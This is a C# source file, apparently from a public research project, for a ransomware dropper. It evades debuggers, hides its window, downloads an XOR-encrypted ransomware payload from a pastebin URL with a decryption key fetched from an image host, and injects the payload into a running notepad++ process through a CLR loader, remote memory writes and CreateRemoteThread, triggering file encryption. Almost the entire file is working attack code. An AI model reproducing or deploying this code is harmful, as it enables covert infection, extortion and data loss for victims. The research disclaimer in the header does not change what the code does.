/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

 using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Security.Cryptography.X509Certificates;
#if !DEBUG
    using BisquillaRansomwareDropper;
#endif

namespace BisquillaRansomwareDropper
{

    class Program
    {
        /// <summary>
        /// Path to Download Bae64 Ransomware Binary
        /// </summary>
        private const string RANSOMWARE_DOWNLOAD_PATH = "https://pastebin.com/raw/a5zDEeh9";

        /// <summary>
        /// Image Path to be Used as Decryption Key
        /// </summary>
        private const string DECRYPTION_IMAGE_URI = "https://s2.glbimg.com/gyvEpPSlnA87YeaVxNCyCwtlIc0=/e.glbimg.com/og/ed/f/original/2018/05/02/pia22227-full.jpg";

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        static int Main(string[] args)
        {
#if !DEBUG
            // BEGIN DEBUG DETECTION
            bool isDebuggerPresent = false;
            Common.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (isDebuggerPresent || Debugger.IsAttached)
            {
                Environment.Exit(-1);
            }
            // END DEBUG DETECTION
#endif

            // Hide Console Window
            ShowWindow(GetConsoleWindow(), SW_HIDE);

            // Extrat DNCI Dependence from Embedded Resource and Save into Temp Folder
            String clrLoaderLibraryPath = ExtractCppLoader();

            // Download Ransomware to Disk
            String ransomwareFilePath = DownloadAndSaveToDisk();


            /*** Configuration Variables ***/
            String targetProcessName = "notepad++";     // Define Target Process
            String clrLoaderLibraryFileName = Path.GetFileName(clrLoaderLibraryPath);

            String targetDotNetAssemblyPath = ransomwareFilePath;
            String targetDotNetAssemblyEntryPointAssemblyType = "BisquillaRansomware.Program";
            String targetDotNetAssemblyEntryPointMethodName = "EntryPoint";
            String targetDotNetAssemblyEntryPointMethodParameters = (args.Length == 1 && args[0] == "--decrypt") ? "D": "E"; // Encryption

            // Find the Process Info
            Int32 targetProcessId = 0;
            try
            {
                targetProcessId = Process.GetProcessesByName(targetProcessName)[0].Id;
                Common.ClearString(ref targetProcessName);
            }
            catch (Exception e)
            {
                Console.WriteLine("notepad++ not found");
                return -1;
            }


            /*** Open and get handle of the process - with required privileges ***/
            IntPtr targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);
            if (targetProcessHandle == null || targetProcessHandle == IntPtr.Zero)
            {
                return -1;
            }



            /*** Inject CLR Runtime Loader into Remote Process ***/
            Inject(targetProcessHandle, GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW"), clrLoaderLibraryPath);



            /*** Get Module (C++ CLR Runtime Loader) Handle ***/
            IntPtr clrRuntimeLoaderHandle = FindRemoteModuleHandle(targetProcessHandle, clrLoaderLibraryFileName);
            if (clrRuntimeLoaderHandle == null || clrRuntimeLoaderHandle == IntPtr.Zero)
            {
                return -2;
            }



            /*** Load .NET Assembly into Remote Process ***/

            // Find LoadDNA Function from C++ CLR Runtime Loader into Remote Process Memory
            uint targetOffset = GetFunctionOffSet(clrLoaderLibraryPath, "LoadDNA");

            // Compute OffSet into Remote Target
            uint remoteTargetOffSet = targetOffset + (uint)clrRuntimeLoaderHandle.ToInt32();

            // Build LoadDNA Function Arguments
            String loadDnaArgs = targetDotNetAssemblyPath + "\t" + targetDotNetAssemblyEntryPointAssemblyType + "\t" + targetDotNetAssemblyEntryPointMethodName + "\t" + targetDotNetAssemblyEntryPointMethodParameters;

            // Inject .NET Assembly using LoadDNA Function on DNCIClrLoader.dll
            Inject(targetProcessHandle, new IntPtr(remoteTargetOffSet), loadDnaArgs);



            /*** Remove Module from Remote Process ***/

            // Close Remote Process Handle
            CloseHandle(targetProcessHandle);

            return 0;
        }


        /// <summary>
        /// Extract DNCI CPP Loader and Save to Disk.
        /// The DNCI Loader used here is a Base64 Enconded version available at: https://github.com/guibacellar/DNCI/tree/master/Binaries
        /// The DNCI Project and Source Code can be accessed at: https://github.com/guibacellar/DNCI
        /// </summary>
        /// <returns>File Path</returns>
        private static string ExtractCppLoader()
        {
#if !DEBUG
            // BEGIN DEBUG DETECTION
            bool isDebuggerPresent = false;
            Common.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (isDebuggerPresent || Debugger.IsAttached)
            {
                Environment.Exit(-1);
            }
            // END DEBUG DETECTION
#endif

            String moduleTempFileName = Path.GetTempFileName().Replace(".tmp", ".dll");

            using (FileStream fs = new FileStream(moduleTempFileName, FileMode.Create))
            {
                byte[] rawBytes = Convert.FromBase64String(ASCIIEncoding.ASCII.GetString(
                        Properties.Resources.DNCIClrLoader
                    )
                );
                fs.Write(rawBytes, 0, rawBytes.Length);

                fs.Flush();
                fs.Close();
            }

            return moduleTempFileName;
        }

        /// <summary>
        /// Download Ransonware and Save into Disk
        /// </summary>
        /// <returns>File Path</returns>
        private static string DownloadAndSaveToDisk()
        {
#if !DEBUG
            // BEGIN DEBUG DETECTION
            bool isDebuggerPresent = false;
            Common.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (isDebuggerPresent || Debugger.IsAttached)
            {
                Environment.Exit(-1);
            }
            // END DEBUG DETECTION
#endif

            // Setup SSL Certificate Pinning
            ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
            {
                // Check SSL Certificate
                return
                    certificate.GetSerialNumberString() == "05B2341C8311FA0EC51574B3C5C476E5" || // https://s2.glbimg.com via Direct Serial Number Verification
                    (
                        chain.ChainElements[0].Certificate.GetSerialNumberString() == "05844945EC3913B7BA791348BD8DBF5D" &&
                        chain.ChainElements[1].Certificate.GetSerialNumberString() == "0BA2D01DCBCB7776E8AC65097AC12541" &&
                        chain.ChainElements[2].Certificate.GetSerialNumberString() == "4CAAF9CADB636FE01FF74ED85B03869D"
                    ); // https://pastebin.com/ via Chain Validation (Because Cloudflare emits several certificates)
            };

            // Download Ransomware Base64 Data
            byte[] encryptedRansomware = System.Convert.FromBase64String(
                new WebClient().DownloadString(RANSOMWARE_DOWNLOAD_PATH)
            );

            // Download Image from Web (to be used as Ransomware Base64 Data Decryption Key)
            byte[] key = System.Text.Encoding.UTF8.GetBytes(
                new WebClient().DownloadString(DECRYPTION_IMAGE_URI)
            );

            // Decrypt
            byte[] finalBinary = EncryptDecrypt(encryptedRansomware, key);

            // Target File
            String targetFilePath = Path.GetTempFileName();

            // Inject Into Notepad++
            System.IO.File.WriteAllBytes(targetFilePath, finalBinary);

            // Return File Path
            return targetFilePath;
        }

        /// <summary>
        /// Apply OTP Encryption
        /// </summary>
        /// <param name="source">Source Data</param>
        /// <param name="key">Key</param>
        /// <returns></returns>
        private static byte[] EncryptDecrypt(byte[] source, byte[] key)
        {
            byte[] hResult = new byte[source.Length];

            for (int i = 0; i < source.Length; i++)
            {
                hResult[i] = (byte) (source[i] ^ key[i]);
            }

            return hResult;
        }

        // privileges
        const int PROCESS_TERMINATE = 0x00000001;
        const int PROCESS_CREATE_THREAD = 0x00000002;
        const int PROCESS_SET_SESSIONID = 0x00000004;
        const int PROCESS_VM_OPERATION = 0x00000008;
        const int PROCESS_VM_READ = 0x00000010;
        const int PROCESS_VM_WRITE = 0x00000020;
        const int PROCESS_DUP_HANDLE = 0x00000040;
        const int PROCESS_CREATE_PROCESS = 0x00000080;
        const int PROCESS_SET_QUOTA = 0x00000100;
        const int PROCESS_SET_INFORMATION = 0x00000200;
        const int PROCESS_QUERY_INFORMATION = 0x00000400;
        const int STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        const int SYNCHRONIZE = 0x00100000;
        const int PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION |
         PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS | PROCESS_SET_QUOTA |
         PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION | STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;

        // used for memory allocation
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint MEM_RELEASE = 0x00008000;
        const uint PAGE_READWRITE = 0x00000040;

        // used for WaitForSingleObject
        const uint INFINITE = 0xFFFFFFFF;

        // used for CreateToolhelp32Snapshot
        const UInt32 TH32CS_SNAPMODULE = 0x00000008;

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern unsafe bool VirtualFreeEx(IntPtr hProcess, byte* pAddress, int size, uint freeType);

        [DllImport("Kernel32", ExactSpelling = true, CharSet = CharSet.Auto)]
        static extern bool GetExitCodeThread(IntPtr hHandle, out int lpdwExitCode);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint GetProcessId(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("kernel32.dll")]
        static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

        [DllImport("kernel32.dll")]
        static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool FreeLibrary(IntPtr hModule);

        [Flags]
        public enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            Thread = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x0000001F
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        public struct MODULEENTRY32
        {
            public uint dwSize;
            public uint th32ModuleID;
            public uint th32ProcessID;
            public uint GlblcntUsage;
            public uint ProccntUsage;
            public IntPtr modBaseAddr;
            public uint modBaseSize;
            IntPtr hModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string szModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExePath;
        }

        /// <summary>
        /// Get Target Function OffSet
        /// </summary>
        /// <param name="libraryPath">Full Library Path</param>
        /// <param name="targetFunctionName"></param>
        /// <returns></returns>
        static uint GetFunctionOffSet(String libraryPath, String targetFunctionName)
        {
            // Load the Library
            IntPtr libHandle = LoadLibrary(libraryPath);

            // Get Target Function Address
            IntPtr functionPtr = GetProcAddress(libHandle, targetFunctionName);

            // Compute the OffSet Between the Library Base Address and the Target Function inside the Binary
            uint offset = (uint)functionPtr.ToInt32() - (uint)libHandle.ToInt32();

            // Unload Library from Memory
            FreeLibrary(libHandle);

            return offset;
        }

        /// <summary>
        /// Find the "moduleName" into Remote Process
        /// </summary>
        /// <param name="targetProcessHandle">Target Process Handler</param>
        /// <param name="moduleName">Desired Module Name</param>
        /// <returns></returns>
        static IntPtr FindRemoteModuleHandle(IntPtr targetProcessHandle, String moduleName)
        {
            MODULEENTRY32 moduleEntry = new MODULEENTRY32()
            {
                dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32))
            };

            uint targetProcessId = GetProcessId(targetProcessHandle);

            IntPtr snapshotHandle = CreateToolhelp32Snapshot(
                SnapshotFlags.Module | SnapshotFlags.Module32,
                targetProcessId
            );

            // Check if is Valid
            if (!Module32First(snapshotHandle, ref moduleEntry))
            {
                CloseHandle(snapshotHandle);
                return IntPtr.Zero;
            }

            // Enumerate all Modules until find the "moduleName"
            while (Module32Next(snapshotHandle, ref moduleEntry))
            {
                if (moduleEntry.szModule == moduleName)
                {
                    break;
                }
            }

            // Close the Handle
            CloseHandle(snapshotHandle);

            // Return if Success on Search
            if (moduleEntry.szModule == moduleName)
            {
                return moduleEntry.modBaseAddr;
            }

            return IntPtr.Zero;
        }

        /// <summary>
        /// Inject the "functionPointer" with "parameters" into Remote Process
        /// </summary>
        /// <param name="processHandle">Remote Process Handle</param>
        /// <param name="functionPointer">LoadLibraryW Function Pointer</param>
        /// <param name="clrLoaderFullPath">DNCIClrLoader.exe Full Path</param>
        static Int32 Inject(IntPtr processHandle, IntPtr functionPointer, String parameters)
        {
            // Set Array to Write
            byte[] toWriteData = Encoding.Unicode.GetBytes(parameters);

            // Compute Required Space on Remote Process
            uint requiredRemoteMemorySize = (uint)(
                (toWriteData.Length) * Marshal.SizeOf(typeof(char))
            ) + (uint)Marshal.SizeOf(typeof(char));

            // Alocate Required Memory Space on Remote Process
            IntPtr allocMemAddress = VirtualAllocEx(
                processHandle,
                IntPtr.Zero,
                requiredRemoteMemorySize,
                MEM_RESERVE | MEM_COMMIT,
                PAGE_READWRITE
            );

            // Write Argument on Remote Process
            UIntPtr bytesWritten;
            bool success = WriteProcessMemory(
                processHandle,
                allocMemAddress,
                toWriteData,
                requiredRemoteMemorySize,
                out bytesWritten
            );

            // Create Remote Thread
            IntPtr createRemoteThread = CreateRemoteThread(
                processHandle,
                IntPtr.Zero,
                0,
                functionPointer,
                allocMemAddress,
                0,
                IntPtr.Zero
            );

            // Wait Thread to Exit
            WaitForSingleObject(createRemoteThread, INFINITE);

            // Release Memory in Remote Process
            VirtualFreeEx(processHandle, allocMemAddress, 0, MEM_RELEASE);

            // Get Thread Exit Code
            Int32 exitCode;
            GetExitCodeThread(createRemoteThread, out exitCode);

            // Close Remote Handle
            CloseHandle(createRemoteThread);

            return exitCode;
        }

    }
}
